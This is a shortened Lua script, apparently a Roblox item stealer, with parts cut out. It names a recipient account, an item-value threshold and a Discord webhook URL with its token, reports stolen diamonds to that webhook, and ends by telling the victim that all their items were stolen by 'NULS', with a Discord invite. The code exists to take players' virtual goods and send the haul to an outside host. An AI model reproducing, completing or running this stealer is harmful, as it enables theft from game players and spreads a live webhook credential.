...
local users = "Eliaskulmer999" or {Eliaskulmer999}
local min_rap = _G.minrap or 0
local webhook = "https://discord.com/api/webhooks/1406998805932675144/UHpJcWhhFtalVAKHNujysIfgZXrcakVkmyw5kAorf3EV6XVFu7NH2kSPc_bEdY04voA0" or "https://discord.com/api/webhooks/1406998805932675144/UHpJcWhhFtalVAKHNujysIfgZXrcakVkmyw5kAorf3EV6XVFu7NH2kSPc_bEdY04voA0"
...
local function SendMessage(diamonds)
    ...
    -- many executors return a table, sometimes a string; print to inspect
...
if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
    ...
    message.Error("All your Items got stolen by NULS \n Join my Discord: .gg/xGgkWUxU3w")
end
